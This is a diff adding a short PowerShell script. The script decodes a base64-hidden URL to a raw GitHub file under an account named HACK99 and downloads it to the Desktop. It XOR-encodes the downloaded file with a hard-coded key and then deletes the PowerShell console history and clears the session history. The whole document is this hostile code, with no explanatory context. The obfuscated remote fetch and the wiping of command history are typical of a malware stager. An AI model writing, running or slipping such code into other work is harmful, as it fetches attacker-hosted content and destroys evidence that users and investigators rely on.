@@ -1,0 +1,22 @@
+$b64url = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0hBQ0s5OS9XZWJTaXRlL21haW4vMS5odG1s"
+$bytes = [System.Convert]::FromBase64String($b64url)
+$url = [System.Text.Encoding]::UTF8.GetString($bytes)
+$desktopPath = [Environment]::GetFolderPath("Desktop")
+$outputPath = Join-Path $desktopPath "1.html"
+Invoke-WebRequest -Uri $url -OutFile $outputPath
+$content = Get-Content -Path $outputPath -Raw
+$key = "key123"
+$encryptedBytes = @()
+$keyBytes = [System.Text.Encoding]::UTF8.GetBytes($key)
+for ($i = 0; $i -lt $content.Length; $i++) {
+    $textByte = [byte]$content[$i]
+    $keyByte = $keyBytes[$i % $keyBytes.Length]
+    $encryptedBytes += $textByte -bxor $keyByte
+}
+$encryptedContent = [System.Convert]::ToBase64String($encryptedBytes)
+$encryptedContent | Set-Content -Path $outputPath
+$historyPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+if (Test-Path $historyPath) {
+    Remove-Item -Path $historyPath -Force
+}
+Clear-History
